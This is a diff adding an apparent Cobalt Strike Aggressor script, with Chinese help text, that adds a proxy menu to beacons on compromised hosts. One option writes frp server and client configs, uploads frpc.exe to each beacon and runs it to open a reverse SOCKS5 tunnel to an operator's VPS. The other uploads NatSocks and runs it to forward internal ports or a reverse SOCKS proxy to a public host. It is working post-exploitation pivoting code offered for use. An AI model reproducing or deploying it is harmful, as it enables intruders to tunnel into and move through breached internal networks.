@@ -1,0 +1,107 @@
+sub frpsocks{
+	if("README" eq $2){
+		show_message("FrpSocks5帮助\ntips:如果你的VPS上已经监听好了FRP则直接填写对应的配置即可\nserver_addr:你的VPS地址\nserver_port:VPS上FPR对应的监听端口\ntoken:FRP的token验证\nsocks5_Listenport:VPS SOCKS5成功后监听的贷款");
+	}else{
+		foreach $id ($bid){
+			btask($id, "server_addr:$3['addr'] server_port:$3['port'] token:$3['token'] socks5Listenport:$3['listenport']");
+			btask($id, "Create frps.ini and frpc.ini");
+			btask($id, "VPS(frps):nohup ./frps -c frps.ini &");
+			btask($id, "Client:frpc.exe -c frpc.ini");
+		}
+		#生成frps.ini和frpc.ini
+		$serverdata = "[common]
+	bind_port = $3['port']
+	token = $3['token']";
+
+		$clientdata = "[common]
+	server_addr = $3['addr']
+	server_port = $3['port']
+	token = $3['token']
+
+	[socks5]
+	type = tcp
+	remote_port = $3['listenport']
+	plugin = socks5
+	use_encryption = true
+	use_compression = true";
+
+		#配置文件保存路径
+		$serverpath = script_resource("frps.ini");
+		$clientpath = script_resource("frpc.ini");
+		$f = openf(">$serverpath");
+		writeb($f, $serverdata);
+		closef($f);
+
+		$f = openf(">$clientpath");
+		writeb($f, $clientdata);
+		closef($f);
+
+		#上传frpc.exe和frpc.ini到目标
+		foreach $id ($bid){
+			bupload($id, script_resource("frpc.exe"));
+			bupload($id, script_resource("frpc.ini"));
+			btask($id, "frpc.exe -c frpc.ini");
+			bshell($id, "frpc.exe -c frpc.ini");
+		}
+	}
+}
+
+sub natsocks {
+	if("README" eq $2){
+		show_message("NatSocks帮助\nmode:resocks为反弹socsk5\nslave为反弹指定端口\n端口映射\n将内网机器(127.0.0.1)的3389端口转发到公网机器(8.8.8.8)的2017端口:\n公网机器(8.8.8.8)：NatSocks -listen 1997 2017\nSocks5\n内网机器(127.0.0.1)：NatSocks -slave 127.0.0.1:3389 8.8.8.8:1997\n在内网机器(127.0.0.1)的1080端口建立socks服务并转发到公网机器(8.8.8.8)的2017端口:\n公网机器(8.8.8.8)：NatSocks -listen 1997 2017\n内网机器(127.0.0.1)：NatSocks -resocks 127.0.0.1:1080 8.8.8.8:1997")
+	}else{
+		if($3['arch'] eq "x64"){
+			$name = "NatSocks.x64.exe";
+			$path = script_resource("NatSocks.x64.exe");
+		}else{
+			$name = "NatSocks.x86.exe";
+			$path = script_resource("NatSocks.x86.exe");
+		}
+		$command = "$name -$3['mode'] $3['Intranet']\:$3['Intranetport'] $3['remoteaddr']\:$3['remoteport']";
+		foreach $id ($bid){
+			bupload($id, $path);
+			btask($id, $command);
+			bshell($id, $command);
+		}
+		
+	}
+}
+
+sub frpwindow {
+	$dialog = dialog("frp socks5 config", %(addr => "0.0.0.0", port => "7000", token => "RaidenMei", listenport => "8088", bid => $bid), &frpsocks);
+	dialog_description($dialog, "frp socks5 配置文件生成上传");
+	drow_text($dialog, "addr", "server_addr:  ");
+	drow_text($dialog, "port", "server_port: ");
+	drow_text($dialog, "token", "token: ");
+	drow_text($dialog, "listenport", "socks5_Listenport: ");
+	dbutton_action($dialog, "Create");
+	dbutton_action($dialog, "README");
+	dialog_show($dialog);
+}
+
+sub NatSockswindow {
+	$dialog = dialog("NatSocks socks5 config", %(Intranet => "127.0.0.1", Intranetport => "1080", remoteaddr => "1.1.1.1", remoteport => "1997", arch => "x64", mode => "resocks"), &natsocks);
+	dialog_description($dialog, "NatSocks Socks5反弹,Arch:x64/x86\nmode:resocks为反弹socsk5\nslave为反弹指定端口");
+	drow_text($dialog, "Intranet", "Intranet:  ");
+	drow_text($dialog, "Intranetport", "Intranetport: ");
+	drow_text($dialog, "remoteaddr", "VPSAddr: 	");
+	drow_text($dialog, "remoteport", "VPSport:	");
+	drow_text($dialog, "mode", "mode:	");
+	drow_text ($dialog, "arch", "Arch:	");
+	dbutton_action($dialog, "Go");
+	dbutton_action($dialog, "README");
+	dialog_show($dialog);
+}
+
+popup beacon_bottom{
+	$bid = $1;
+	menu "代理"{
+		item "frp"{
+			frpwindow($bid);
+		}
+		
+		item "NatSocks"{
+			NatSockswindow($bid);
+		}
+	}
+}
